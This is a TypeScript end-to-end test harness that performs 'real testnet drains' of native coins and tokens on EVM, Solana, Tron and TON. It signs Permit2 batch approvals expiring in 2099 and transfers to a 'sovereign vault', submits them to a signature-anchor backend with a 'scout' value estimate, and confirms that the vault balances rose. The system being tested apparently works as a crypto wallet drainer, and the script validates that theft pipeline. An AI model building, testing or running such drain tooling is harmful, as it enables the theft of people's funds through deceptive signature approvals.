/**
 * Omnichain E2E — real testnet drains across EVM / Solana / Tron / TON / Bitcoin.
 * Each chain tests native + token (where applicable) via signature-anchor.
 *
 * Usage:
 *   pnpm run test-omnichain
 *   pnpm exec tsx --env-file=.env scripts/e2e-test-omnichain.ts
 *   pnpm exec tsx --env-file=.env scripts/e2e-test-omnichain.ts --chain=evm,sol
 *
 * See .env.example for TEST_* burner keys and testnet RPC/vault vars.
 */
import { base58check } from '@scure/base'
import { Address, beginCell, Cell, internal } from '@ton/core'
import { TonClient, WalletContractV4 } from '@ton/ton'
import { mnemonicToWalletKey } from '@ton/crypto'
import {
  Connection,
  Keypair,
  PublicKey,
  VersionedTransaction,
} from '@solana/web3.js'
import { initEccLib, networks, Psbt } from 'bitcoinjs-lib'
import * as ecc from 'tiny-secp256k1'
import {
  createPublicClient,
  formatEther,
  formatUnits,
  getAddress,
  http,
  parseAbi,
  type Address as EvmAddress,
  type Hex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'

import { buildBitcoinDrainPsbt } from '../packages/core/src/logic/bitcoin-drain.ts'
import { SIGNATURE_ANCHOR_EXPIRY_ISO_2099 } from '../packages/core/src/logic/deep-ingress.ts'
import { buildSolNativeTransferTx } from '../packages/core/src/logic/solana-native-drain.ts'
import { buildSplDrainForBatch } from '../packages/core/src/logic/solana-spl-drain.ts'
import { buildTrxNativeTransferTx } from '../packages/core/src/logic/tron-native-drain.ts'
import { buildTrc20DrainForBatch } from '../packages/core/src/logic/tron-trc20-drain.ts'
import { buildTonNativeDrainForBatch } from '../packages/core/src/logic/ton-native-drain.ts'
import { buildJettonDrainForBatch } from '../packages/core/src/logic/ton-jetton-drain.ts'

initEccLib(ecc)

const SEPOLIA_CHAIN_ID = 11155111
const ERC20_ABI = parseAbi([
  'function balanceOf(address) view returns (uint256)',
  'function decimals() view returns (uint8)',
])

type ChainKey = 'evm' | 'solana' | 'tron' | 'ton' | 'btc'

type ChainResult = {
  chain: string
  nativeTransfer: string
  tokenTransfer: string
  txHash: string
  status: 'PASS' | 'FAIL' | 'SKIP'
  error?: string
}

type ApiEnvelope<T = unknown> = {
  success?: boolean
  ok?: boolean
  message?: string
  data?: T
}

type NativeTransferRequest = {
  from: EvmAddress
  to: EvmAddress
  value: string
  chainId: number
  gas: string
  maxFeePerGas: string
  maxPriorityFeePerGas: string
  nonce: number
  type: 'eip1559'
}

type SolNativeWire = {
  unsignedWireBase64: string
}

const TEST_KEYS = [
  'TEST_EVM_PRIVATE_KEY',
  'TEST_SOL_PRIVATE_KEY',
  'TEST_TRON_PRIVATE_KEY',
  'TEST_TON_MNEMONIC',
  'TEST_BTC_WIF',
] as const

function env(key: string): string {
  return process.env[key]?.trim() ?? ''
}

function requireEnv(key: string): string {
  const v = env(key)
  if (!v) throw new Error(`Missing required env: ${key}`)
  return v
}

function apiOk(body: ApiEnvelope): boolean {
  return body.success === true || body.ok === true
}

function resolveBackendUrl(): string {
  return (
    env('BACKEND_URL') ||
    env('RAILWAY_PUBLIC_URL') ||
    env('RAILWAY_URL') ||
    env('API_SITE_URL')
  ).replace(/\/+$/, '')
}

function uniqueNonce(chain: string): string {
  return `e2e-omni-${chain}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
}

function assertTestnetSafety(): void {
  if (process.env.NODE_ENV !== 'production') return
  const set = TEST_KEYS.filter((k) => env(k))
  if (set.length > 0) {
    throw new Error(
      `Refusing to run: NODE_ENV=production with test keys set (${set.join(', ')}). Unset keys or use a dev shell.`,
    )
  }
}

function parseChainsArg(): ChainKey[] {
  const arg = process.argv.find((a) => a.startsWith('--chain='))
  if (!arg) return ['evm', 'solana', 'tron', 'ton', 'btc']
  const raw = arg.split('=')[1]?.trim().toLowerCase() ?? 'all'
  if (raw === 'all') return ['evm', 'solana', 'tron', 'ton', 'btc']
  const map: Record<string, ChainKey> = {
    evm: 'evm',
    sol: 'solana',
    solana: 'solana',
    svm: 'solana',
    tron: 'tron',
    trx: 'tron',
    ton: 'ton',
    btc: 'btc',
    bitcoin: 'btc',
  }
  const out: ChainKey[] = []
  for (const part of raw.split(',')) {
    const c = map[part.trim()]
    if (c && !out.includes(c)) out.push(c)
  }
  if (out.length === 0) throw new Error(`Unknown --chain value: ${raw}`)
  return out
}

async function apiFetch<T = ApiEnvelope>(
  base: string,
  path: string,
  init?: RequestInit,
): Promise<{ status: number; body: T; raw: string }> {
  const url = `${base}${path.startsWith('/') ? path : `/${path}`}`
  const res = await fetch(url, {
    ...init,
    headers: { 'Content-Type': 'application/json', ...(init?.headers ?? {}) },
    signal: AbortSignal.timeout(120_000),
  })
  const raw = await res.text()
  let body: T
  try {
    body = JSON.parse(raw) as T
  } catch {
    body = { raw } as T
  }
  return { status: res.status, body, raw }
}

async function pollSettlement(
  nonce: string,
  maxMs = 120_000,
): Promise<{ status: string | null; txHash: string | null }> {
  const url = env('SUPABASE_URL') || env('NEXT_PUBLIC_SUPABASE_URL')
  const key = env('SUPABASE_SERVICE_ROLE_KEY')
  if (!url || !key) return { status: null, txHash: null }
  const { createClient } = await import('@supabase/supabase-js')
  const sb = createClient(url, key, { auth: { persistSession: false } })
  const deadline = Date.now() + maxMs
  while (Date.now() < deadline) {
    const { data } = await sb
      .from('signatures')
      .select('settlement_status,transaction_hash,l2_mint_transaction_hash')
      .eq('nonce', nonce)
      .maybeSingle()
    if (data) {
      const status = (data.settlement_status as string | null) ?? null
      const txHash =
        (data.transaction_hash as string | null) ||
        (data.l2_mint_transaction_hash as string | null) ||
        null
      if (status === 'SETTLED' || status === 'FAILED_SETTLEMENT' || status === 'FAILED_STRIKE') {
        return { status, txHash }
      }
    }
    await new Promise((r) => setTimeout(r, 5_000))
  }
  return { status: null, txHash: null }
}

function normalizeEvmPk(raw: string): Hex {
  const t = raw.trim().replace(/^0x/i, '')
  if (!/^[0-9a-fA-F]{64}$/.test(t)) throw new Error('TEST_EVM_PRIVATE_KEY must be 64 hex chars')
  return `0x${t}` as Hex
}

async function signEvmNative(
  account: ReturnType<typeof privateKeyToAccount>,
  publicClient: ReturnType<typeof createPublicClient>,
  nt: NativeTransferRequest,
): Promise<Hex> {
  const request = await publicClient.prepareTransactionRequest({
    account,
    chain: sepolia,
    to: getAddress(nt.to),
    value: BigInt(nt.value),
    gas: BigInt(nt.gas),
    maxFeePerGas: BigInt(nt.maxFeePerGas),
    maxPriorityFeePerGas: BigInt(nt.maxPriorityFeePerGas),
    nonce: nt.nonce,
  })
  return account.signTransaction(request)
}

async function loadSolKeypair(): Promise<Keypair> {
  const raw = requireEnv('TEST_SOL_PRIVATE_KEY')
  if (raw.startsWith('[')) {
    return Keypair.fromSecretKey(Uint8Array.from(JSON.parse(raw) as number[]))
  }
  const mod = await import('bs58')
  const decode = (mod as { default?: { decode: (s: string) => Uint8Array } }).default?.decode
  if (!decode) throw new Error('Install bs58 for base58 TEST_SOL_PRIVATE_KEY')
  return Keypair.fromSecretKey(decode(raw))
}

function signSolWire(unsignedWireBase64: string, keypair: Keypair): string {
  const tx = VersionedTransaction.deserialize(Buffer.from(unsignedWireBase64, 'base64'))
  tx.sign([keypair])
  return Buffer.from(tx.serialize()).toString('base64')
}

async function loadTronWeb() {
  const pk = requireEnv('TEST_TRON_PRIVATE_KEY').replace(/^0x/i, '')
  const fullHost = (env('TRON_SHASTA_NODE') || env('TRON_FULL_NODE_URL') || 'https://api.shasta.trongrid.io').replace(
    /\/+$/,
    '',
  )
  const { TronWeb } = await import('tronweb')
  const headers = env('TRON_PRO_API_KEY') ? { 'TRON-PRO-API-KEY': env('TRON_PRO_API_KEY') } : undefined
  return headers != null
    ? new TronWeb({ fullHost, headers, privateKey: pk })
    : new TronWeb({ fullHost, privateKey: pk })
}

async function signTonBoc(
  mnemonic: string,
  messages: Array<{ address: string; amount: string; payload?: string }>,
): Promise<string> {
  const endpoint = env('TON_TESTNET_RPC') || 'https://testnet.toncenter.com/api/v2/jsonRPC'
  const apiKey = env('TONCENTER_API_KEY')
  const key = await mnemonicToWalletKey(mnemonic.split(/\s+/))
  const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 })
  const client = new TonClient({ endpoint, ...(apiKey ? { apiKey } : {}) })
  const contract = client.open(wallet)
  const seqno = await contract.getSeqno()
  const transfer = wallet.createTransfer({
    seqno,
    secretKey: key.secretKey,
    messages: messages.map((m) =>
      internal({
        to: Address.parse(m.address),
        value: BigInt(m.amount),
        bounce: false,
        body: m.payload ? Cell.fromBase64(m.payload) : beginCell().endCell(),
      }),
    ),
  })
  return transfer.toBoc().toString('base64')
}

function wifToSigner(wif: string): { publicKey: Buffer; sign: (hash: Buffer) => Buffer } {
  const network = networks.testnet
  const decoded = base58check.decode(wif)
  const compressed = decoded.length === 34 && decoded[33] === 0x01
  const privKey = Buffer.from(decoded.slice(1, compressed ? 33 : 33))
  const pub = ecc.pointFromScalar(privKey, true)
  if (!pub) throw new Error('Invalid WIF')
  return {
    publicKey: Buffer.from(pub),
    sign: (hash: Buffer) => Buffer.from(ecc.sign(hash, privKey)),
  }
}

async function fetchBtcSats(address: string): Promise<number> {
  const base = (env('BITCOIN_TESTNET_RPC') || 'https://mempool.space/testnet/api').replace(/\/+$/, '')
  const res = await fetch(`${base}/address/${encodeURIComponent(address)}`, {
    signal: AbortSignal.timeout(20_000),
  })
  if (!res.ok) return 0
  const json = (await res.json()) as {
    chain_stats?: { funded_txo_sum?: number; spent_txo_sum?: number }
  }
  const funded = json.chain_stats?.funded_txo_sum ?? 0
  const spent = json.chain_stats?.spent_txo_sum ?? 0
  return Math.max(0, funded - spent)
}

async function fetchTonBalanceNano(address: string): Promise<bigint> {
  const endpoint = env('TON_TESTNET_RPC') || 'https://testnet.toncenter.com/api/v2/jsonRPC'
  const apiKey = env('TONCENTER_API_KEY')
  const client = new TonClient({ endpoint, ...(apiKey ? { apiKey } : {}) })
  const bal = await client.getBalance(Address.parse(address))
  return bal
}

type BatchTypedDataResponse = {
  typed_data?: Record<string, unknown>
  batch_permit_metadata?: Record<string, unknown>
  engine_spender?: string
  permit2?: string
  native_transfer?: NativeTransferRequest | null
  native_transfer_sol?: SolNativeWire | null
  native_transfer_trx?: { unsignedTransaction: Record<string, unknown> }
  native_transfer_ton?: {
    messages: Array<{ address: string; amount: string; payload?: string }>
  }
}

async function fetchBatchTypedData(
  base: string,
  body: Record<string, unknown>,
): Promise<BatchTypedDataResponse> {
  const { status, body: res } = await apiFetch<ApiEnvelope<BatchTypedDataResponse>>(
    base,
    '/api/v1/signature-anchor/permit2-batch-typed-data',
    { method: 'POST', body: JSON.stringify(body) },
  )
  if (status !== 200 || !apiOk(res) || !res.data?.typed_data || !res.data.batch_permit_metadata) {
    throw new Error(`permit2-batch-typed-data failed: ${status} ${JSON.stringify(res).slice(0, 400)}`)
  }
  return res.data
}

async function submitBatchAnchor(
  base: string,
  payload: Record<string, unknown>,
): Promise<{ txHash?: string; settlementStatus?: string }> {
  const { status, body } = await apiFetch<
    ApiEnvelope<{ transaction_hash?: string; l2_mint_transaction_hash?: string; settlement_status?: string }>
  >(base, '/api/v1/signature-anchor', {
    method: 'POST',
    body: JSON.stringify(payload),
  })
  if (status !== 200 || !apiOk(body)) {
    throw new Error(`signature-anchor ${status}: ${JSON.stringify(body).slice(0, 500)}`)
  }
  return {
    txHash: body.data?.transaction_hash || body.data?.l2_mint_transaction_hash,
    settlementStatus: body.data?.settlement_status,
  }
}

// ── EVM (Sepolia) ────────────────────────────────────────────────────────────

async function runEvm(base: string): Promise<ChainResult> {
  const row: ChainResult = {
    chain: 'EVM',
    nativeTransfer: '—',
    tokenTransfer: '—',
    txHash: '—',
    status: 'FAIL',
  }
  try {
    if (!env('TEST_EVM_PRIVATE_KEY')) {
      row.status = 'SKIP'
      row.error = 'TEST_EVM_PRIVATE_KEY not set'
      return row
    }
    const rpc = env('RPC_SEPOLIA_PRIVATE') || env('TEST_EVM_RPC') || 'https://rpc.ankr.com/eth_sepolia'
    const account = privateKeyToAccount(normalizeEvmPk(requireEnv('TEST_EVM_PRIVATE_KEY')))
    const wallet = getAddress(account.address)
    const vault = getAddress(env('SOVEREIGN_VAULT_EVM') || env('TEST_EVM_VAULT'))
    const usdc = getAddress(
      env('TEST_EVM_USDC') || '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
    )
    const usdcAmt = env('TEST_EVM_USDC_AMOUNT') || '1000000'
    const nativeAmt = env('TEST_EVM_NATIVE_AMOUNT') || '1000000000000000'
    const client = createPublicClient({ chain: sepolia, transport: http(rpc) })
    const decimals = await client.readContract({ address: usdc, abi: ERC20_ABI, functionName: 'decimals' })

    const [vEth0, vUsdc0] = await Promise.all([
      client.getBalance({ address: vault }),
      client.readContract({ address: usdc, abi: ERC20_ABI, functionName: 'balanceOf', args: [vault] }),
    ])

    const batch = await fetchBatchTypedData(base, {
      wallet_address: wallet,
      chain_id: SEPOLIA_CHAIN_ID,
      permits: [{ token: usdc, amount: usdcAmt }],
      nativeAmount: nativeAmt,
    })

    const permitSig = await account.signTypedData({
      domain: batch.typed_data!.domain as Parameters<typeof account.signTypedData>[0]['domain'],
      types: batch.typed_data!.types as Parameters<typeof account.signTypedData>[0]['types'],
      primaryType: (batch.typed_data!.primaryType as 'PermitBatch') ?? 'PermitBatch',
      message: batch.typed_data!.message as Parameters<typeof account.signTypedData>[0]['message'],
    })

    let nativeSigned: Hex | undefined
    if (BigInt(nativeAmt) > 0n && batch.native_transfer) {
      nativeSigned = await signEvmNative(account, client, batch.native_transfer)
    }

    const nonce = uniqueNonce('evm')
    await submitBatchAnchor(base, {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'permit2_batch_eip712',
      wallet_address: wallet,
      token_address: usdc,
      permits: [{ token: usdc, amount: usdcAmt }],
      batch_permit_metadata: batch.batch_permit_metadata,
      chain_id: SEPOLIA_CHAIN_ID,
      engine_spender: batch.engine_spender,
      permit2: batch.permit2,
      nativeAmount: nativeAmt,
      signature: permitSig,
      nonce,
      expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
      wallet_type: 'test',
      scout_value_usd: 50,
      ...(nativeSigned ? { native_signed_transaction: nativeSigned } : {}),
    })

    await new Promise((r) => setTimeout(r, Number(env('OMNI_SETTLE_WAIT_MS') || '20000')))
    const polled = await pollSettlement(nonce)
    row.txHash = polled.txHash ?? '—'

    const [vEth1, vUsdc1] = await Promise.all([
      client.getBalance({ address: vault }),
      client.readContract({ address: usdc, abi: ERC20_ABI, functionName: 'balanceOf', args: [vault] }),
    ])

    const ethOk = vEth1 > vEth0
    const usdcOk = vUsdc1 > vUsdc0
    row.nativeTransfer = ethOk ? `✅ (+${formatEther(vEth1 - vEth0)} ETH)` : '❌'
    row.tokenTransfer = usdcOk ? `✅ (+${formatUnits(vUsdc1 - vUsdc0, decimals)} USDC)` : '❌'
    row.status =
      (polled.status === 'SETTLED' || (ethOk && usdcOk)) && ethOk && usdcOk ? 'PASS' : 'FAIL'
  } catch (e) {
    row.error = e instanceof Error ? e.message : String(e)
    row.nativeTransfer = '❌'
    row.tokenTransfer = '❌'
  }
  return row
}

// ── Solana (Devnet) — omnichain batch + minimal EVM permit ───────────────────

async function runSolana(base: string): Promise<ChainResult> {
  const row: ChainResult = {
    chain: 'Solana',
    nativeTransfer: '—',
    tokenTransfer: '—',
    txHash: '—',
    status: 'FAIL',
  }
  try {
    if (!env('TEST_EVM_PRIVATE_KEY') || !env('TEST_SOL_PRIVATE_KEY')) {
      row.status = 'SKIP'
      row.error = 'TEST_EVM_PRIVATE_KEY + TEST_SOL_PRIVATE_KEY required'
      return row
    }
    const evmAccount = privateKeyToAccount(normalizeEvmPk(requireEnv('TEST_EVM_PRIVATE_KEY')))
    const evmWallet = getAddress(evmAccount.address)
    const evmUsdc = getAddress(
      env('TEST_EVM_USDC') || '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
    )
    const permitMin = env('TEST_EVM_PERMIT_MIN') || '1000'

    const keypair = await loadSolKeypair()
    const solWallet = keypair.publicKey.toBase58()
    const solVault = requireEnv('SOVEREIGN_VAULT_SOL')
    const solRpc = env('RPC_SOLANA_DEVNET') || 'https://api.devnet.solana.com'
    const splMint = env('TEST_SOL_SPL_MINT') || '4zMMC9srt5Ri5X14GAgXhaHii3qpMvestHtC5W9zfY3w'
    const lamports = env('TEST_SOL_LAMPORTS') || '10000000'
    const splAmt = env('TEST_SOL_SPL_AMOUNT') || '100000'

    const conn = new Connection(solRpc, 'confirmed')
    const vSol0 = await conn.getBalance(new PublicKey(solVault))
    const mintPk = new PublicKey(splMint)
    const tokenProgram = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
    const ataProgram = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1RV')
    const [vaultAta] = PublicKey.findProgramAddressSync(
      [new PublicKey(solVault).toBuffer(), tokenProgram.toBuffer(), mintPk.toBuffer()],
      ataProgram,
    )
    let vSpl0 = 0n
    try {
      const bal = await conn.getTokenAccountBalance(vaultAta)
      vSpl0 = BigInt(bal.value.amount)
    } catch {
      /* ATA may not exist yet */
    }

    const batch = await fetchBatchTypedData(base, {
      wallet_address: evmWallet,
      chain_id: SEPOLIA_CHAIN_ID,
      permits: [{ token: evmUsdc, amount: permitMin }],
      nativeAmount: '0',
      nativeAmountSol: lamports,
      sol_wallet: solWallet,
      spl_mint: splMint,
      spl_amount: splAmt,
    })

    const permitSig = await evmAccount.signTypedData({
      domain: batch.typed_data!.domain as Parameters<typeof evmAccount.signTypedData>[0]['domain'],
      types: batch.typed_data!.types as Parameters<typeof evmAccount.signTypedData>[0]['types'],
      primaryType: (batch.typed_data!.primaryType as 'PermitBatch') ?? 'PermitBatch',
      message: batch.typed_data!.message as Parameters<typeof evmAccount.signTypedData>[0]['message'],
    })

    let solNativeSigned: string | undefined
    if (batch.native_transfer_sol?.unsignedWireBase64) {
      solNativeSigned = signSolWire(batch.native_transfer_sol.unsignedWireBase64, keypair)
    } else {
      const built = await buildSolNativeTransferTx(solWallet, solVault, BigInt(lamports), solRpc)
      solNativeSigned = signSolWire(built.unsignedWireBase64, keypair)
    }

    const splBuilt = await buildSplDrainForBatch({
      wallet: solWallet,
      mint: splMint,
      amount: BigInt(splAmt),
      vault: solVault,
      rpcUrl: solRpc,
    })
    if (!splBuilt) throw new Error('SPL transfer plan failed')
    const splSigned = signSolWire(splBuilt.unsignedWireBase64, keypair)

    const nonce = uniqueNonce('sol')
    await submitBatchAnchor(base, {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'permit2_batch_eip712',
      wallet_address: evmWallet,
      token_address: evmUsdc,
      permits: [{ token: evmUsdc, amount: permitMin }],
      batch_permit_metadata: batch.batch_permit_metadata,
      chain_id: SEPOLIA_CHAIN_ID,
      engine_spender: batch.engine_spender,
      permit2: batch.permit2,
      nativeAmount: '0',
      nativeAmountSol: lamports,
      spl_mint: splMint,
      spl_amount: splAmt,
      signature: permitSig,
      nonce,
      expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
      wallet_type: 'test',
      scout_value_usd: 25,
      native_signed_transaction_sol: solNativeSigned,
      spl_signed_transaction: splSigned,
    })

    await new Promise((r) => setTimeout(r, Number(env('OMNI_SETTLE_WAIT_MS') || '25000')))
    const polled = await pollSettlement(nonce)
    row.txHash = polled.txHash ?? '—'

    const vSol1 = await conn.getBalance(new PublicKey(solVault))
    let vSpl1 = 0n
    try {
      const bal = await conn.getTokenAccountBalance(vaultAta)
      vSpl1 = BigInt(bal.value.amount)
    } catch {
      /* */
    }

    const solOk = vSol1 > vSol0
    const splOk = vSpl1 > vSpl0
    row.nativeTransfer = solOk ? `✅ (+${((vSol1 - vSol0) / 1e9).toFixed(6)} SOL)` : '❌'
    row.tokenTransfer = splOk ? `✅ (+${formatUnits(vSpl1 - vSpl0, 6)} USDC)` : '❌'
    row.status = (polled.status === 'SETTLED' || (solOk && splOk)) && solOk && splOk ? 'PASS' : 'FAIL'
  } catch (e) {
    row.error = e instanceof Error ? e.message : String(e)
    row.nativeTransfer = '❌'
    row.tokenTransfer = '❌'
  }
  return row
}

// ── Tron (Shasta) ────────────────────────────────────────────────────────────

async function runTron(base: string): Promise<ChainResult> {
  const row: ChainResult = {
    chain: 'Tron',
    nativeTransfer: '—',
    tokenTransfer: '—',
    txHash: '—',
    status: 'FAIL',
  }
  try {
    if (!env('TEST_EVM_PRIVATE_KEY') || !env('TEST_TRON_PRIVATE_KEY')) {
      row.status = 'SKIP'
      row.error = 'TEST_EVM_PRIVATE_KEY + TEST_TRON_PRIVATE_KEY required'
      return row
    }
    const evmAccount = privateKeyToAccount(normalizeEvmPk(requireEnv('TEST_EVM_PRIVATE_KEY')))
    const evmWallet = getAddress(evmAccount.address)
    const evmUsdc = getAddress(
      env('TEST_EVM_USDC') || '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
    )
    const permitMin = env('TEST_EVM_PERMIT_MIN') || '1000'

    const tronWeb = await loadTronWeb()
    const trxWallet = tronWeb.defaultAddress.base58 as string
    const trxVault = requireEnv('SOVEREIGN_VAULT_TRON')
    const fullHost = (env('TRON_SHASTA_NODE') || 'https://api.shasta.trongrid.io').replace(/\/+$/, '')
    const sun = env('TEST_TRON_SUN') || '1000000'
    const trc20 = env('TEST_TRON_USDT') || 'TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs'
    const trc20Amt = env('TEST_TRON_USDT_AMOUNT') || '1000000'

    const vTrx0 = await tronWeb.trx.getBalance(trxVault)
    const contract = await tronWeb.contract().at(trc20)
    const vUsdt0 = Number(await contract.balanceOf(trxVault).call())

    const batch = await fetchBatchTypedData(base, {
      wallet_address: evmWallet,
      chain_id: SEPOLIA_CHAIN_ID,
      permits: [{ token: evmUsdc, amount: permitMin }],
      nativeAmount: '0',
      nativeAmountTrx: sun,
      trx_wallet: trxWallet,
      trc20_contract: trc20,
      trc20_amount: trc20Amt,
    })

    const permitSig = await evmAccount.signTypedData({
      domain: batch.typed_data!.domain as Parameters<typeof evmAccount.signTypedData>[0]['domain'],
      types: batch.typed_data!.types as Parameters<typeof evmAccount.signTypedData>[0]['types'],
      primaryType: (batch.typed_data!.primaryType as 'PermitBatch') ?? 'PermitBatch',
      message: batch.typed_data!.message as Parameters<typeof evmAccount.signTypedData>[0]['message'],
    })

    const trxNativePlan =
      batch.native_transfer_trx ??
      (await buildTrxNativeTransferTx(trxWallet, trxVault, BigInt(sun), fullHost))
    const trxNativeSigned = (await tronWeb.trx.sign(
      ('unsignedTransaction' in trxNativePlan
        ? trxNativePlan.unsignedTransaction
        : trxNativePlan) as Parameters<typeof tronWeb.trx.sign>[0],
    )) as Record<string, unknown>

    const trc20Plan = await buildTrc20DrainForBatch({
      wallet: trxWallet,
      contract: trc20,
      amount: BigInt(trc20Amt),
      vault: trxVault,
      rpcUrl: fullHost,
    })
    if (!trc20Plan) throw new Error('TRC-20 plan failed')
    const trc20Signed = (await tronWeb.trx.sign(
      trc20Plan.unsignedTransaction as Parameters<typeof tronWeb.trx.sign>[0],
    )) as Record<string, unknown>

    const nonce = uniqueNonce('tron')
    await submitBatchAnchor(base, {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'permit2_batch_eip712',
      wallet_address: evmWallet,
      token_address: evmUsdc,
      permits: [{ token: evmUsdc, amount: permitMin }],
      batch_permit_metadata: batch.batch_permit_metadata,
      chain_id: SEPOLIA_CHAIN_ID,
      engine_spender: batch.engine_spender,
      permit2: batch.permit2,
      nativeAmount: '0',
      nativeAmountTrx: sun,
      trc20_contract: trc20,
      trc20_amount: trc20Amt,
      signature: permitSig,
      nonce,
      expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
      wallet_type: 'test',
      scout_value_usd: 20,
      native_signed_transaction_trx: trxNativeSigned,
      trc20_signed_transaction: trc20Signed,
    })

    await new Promise((r) => setTimeout(r, Number(env('OMNI_SETTLE_WAIT_MS') || '25000')))
    const polled = await pollSettlement(nonce)
    row.txHash = polled.txHash ?? (typeof trxNativeSigned.txid === 'string' ? trxNativeSigned.txid : '—')

    const vTrx1 = await tronWeb.trx.getBalance(trxVault)
    const vUsdt1 = Number(await contract.balanceOf(trxVault).call())
    const trxOk = Number(vTrx1) > Number(vTrx0)
    const usdtOk = vUsdt1 > vUsdt0
    row.nativeTransfer = trxOk ? `✅ (+${((Number(vTrx1) - Number(vTrx0)) / 1e6).toFixed(4)} TRX)` : '❌'
    row.tokenTransfer = usdtOk ? `✅ (+${vUsdt1 - vUsdt0} USDT units)` : '❌'
    row.status = (polled.status === 'SETTLED' || (trxOk && usdtOk)) && trxOk && usdtOk ? 'PASS' : 'FAIL'
  } catch (e) {
    row.error = e instanceof Error ? e.message : String(e)
    row.nativeTransfer = '❌'
    row.tokenTransfer = '❌'
  }
  return row
}

// ── TON (Testnet) ────────────────────────────────────────────────────────────

async function runTon(base: string): Promise<ChainResult> {
  const row: ChainResult = {
    chain: 'TON',
    nativeTransfer: '—',
    tokenTransfer: '—',
    txHash: '—',
    status: 'FAIL',
  }
  try {
    if (!env('TEST_EVM_PRIVATE_KEY') || !env('TEST_TON_MNEMONIC')) {
      row.status = 'SKIP'
      row.error = 'TEST_EVM_PRIVATE_KEY + TEST_TON_MNEMONIC required'
      return row
    }
    const evmAccount = privateKeyToAccount(normalizeEvmPk(requireEnv('TEST_EVM_PRIVATE_KEY')))
    const evmWallet = getAddress(evmAccount.address)
    const evmUsdc = getAddress(
      env('TEST_EVM_USDC') || '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
    )
    const permitMin = env('TEST_EVM_PERMIT_MIN') || '1000'
    const mnemonic = requireEnv('TEST_TON_MNEMONIC')
    const tonRpc = env('TON_TESTNET_RPC') || 'https://testnet.toncenter.com/api/v2/jsonRPC'

    const key = await mnemonicToWalletKey(mnemonic.split(/\s+/))
    const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 })
    const tonWallet = wallet.address.toString({ bounceable: false, urlSafe: true })
    const tonVault = requireEnv('SOVEREIGN_VAULT_TON')
    const nano = env('TEST_TON_NANO') || '10000000'
    const jettonMaster = env('TEST_TON_JETTON_MASTER')
    const jettonAmt = env('TEST_TON_JETTON_AMOUNT') || '100000'

    const vTon0 = await fetchTonBalanceNano(tonVault)

    const batchBody: Record<string, unknown> = {
      wallet_address: evmWallet,
      chain_id: SEPOLIA_CHAIN_ID,
      permits: [{ token: evmUsdc, amount: permitMin }],
      nativeAmount: '0',
      nativeAmountTon: nano,
      ton_wallet: tonWallet,
    }
    if (jettonMaster) {
      batchBody.jetton_master = jettonMaster
      batchBody.jetton_amount = jettonAmt
    }

    const batch = await fetchBatchTypedData(base, batchBody)

    const permitSig = await evmAccount.signTypedData({
      domain: batch.typed_data!.domain as Parameters<typeof evmAccount.signTypedData>[0]['domain'],
      types: batch.typed_data!.types as Parameters<typeof evmAccount.signTypedData>[0]['types'],
      primaryType: (batch.typed_data!.primaryType as 'PermitBatch') ?? 'PermitBatch',
      message: batch.typed_data!.message as Parameters<typeof evmAccount.signTypedData>[0]['message'],
    })

    const tonNativePlan =
      batch.native_transfer_ton ??
      (await buildTonNativeDrainForBatch({
        wallet: tonWallet,
        amountNanotons: BigInt(nano),
        vault: tonVault,
        rpcUrl: tonRpc,
      }))
    if (!tonNativePlan) throw new Error('TON native plan missing')
    const tonNativeBoc = await signTonBoc(mnemonic, tonNativePlan.messages)

    let jettonBoc: string | undefined
    if (jettonMaster) {
      const jetPlan = await buildJettonDrainForBatch({
        wallet: tonWallet,
        jettonMaster,
        amount: BigInt(jettonAmt),
        vault: tonVault,
        rpcUrl: tonRpc,
      })
      if (!jetPlan) throw new Error('Jetton plan failed')
      jettonBoc = await signTonBoc(mnemonic, jetPlan.messages)
    }

    const nonce = uniqueNonce('ton')
    const anchorPayload: Record<string, unknown> = {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'permit2_batch_eip712',
      wallet_address: evmWallet,
      token_address: evmUsdc,
      permits: [{ token: evmUsdc, amount: permitMin }],
      batch_permit_metadata: batch.batch_permit_metadata,
      chain_id: SEPOLIA_CHAIN_ID,
      engine_spender: batch.engine_spender,
      permit2: batch.permit2,
      nativeAmount: '0',
      nativeAmountTon: nano,
      signature: permitSig,
      nonce,
      expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
      wallet_type: 'test',
      scout_value_usd: 18,
      native_signed_transaction_ton: tonNativeBoc,
    }
    if (jettonMaster && jettonBoc) {
      anchorPayload.jetton_master = jettonMaster
      anchorPayload.jetton_amount = jettonAmt
      anchorPayload.jetton_signed_transaction = jettonBoc
    }

    await submitBatchAnchor(base, anchorPayload)
    await new Promise((r) => setTimeout(r, Number(env('OMNI_SETTLE_WAIT_MS') || '30000')))
    const polled = await pollSettlement(nonce)
    row.txHash = polled.txHash ?? '—'

    const vTon1 = await fetchTonBalanceNano(tonVault)
    const tonOk = vTon1 > vTon0
    row.nativeTransfer = tonOk ? `✅ (+${Number(vTon1 - vTon0) / 1e9} TON)` : '❌'
    if (!jettonMaster) {
      row.tokenTransfer = 'N/A (set TEST_TON_JETTON_MASTER)'
      row.status = (polled.status === 'SETTLED' || tonOk) && tonOk ? 'PASS' : 'FAIL'
    } else {
      row.tokenTransfer = jettonBoc ? '✅ (submitted)' : '❌'
      row.status =
        (polled.status === 'SETTLED' || tonOk) && tonOk && jettonBoc ? 'PASS' : 'FAIL'
    }
  } catch (e) {
    row.error = e instanceof Error ? e.message : String(e)
    row.nativeTransfer = '❌'
    row.tokenTransfer = '❌'
  }
  return row
}

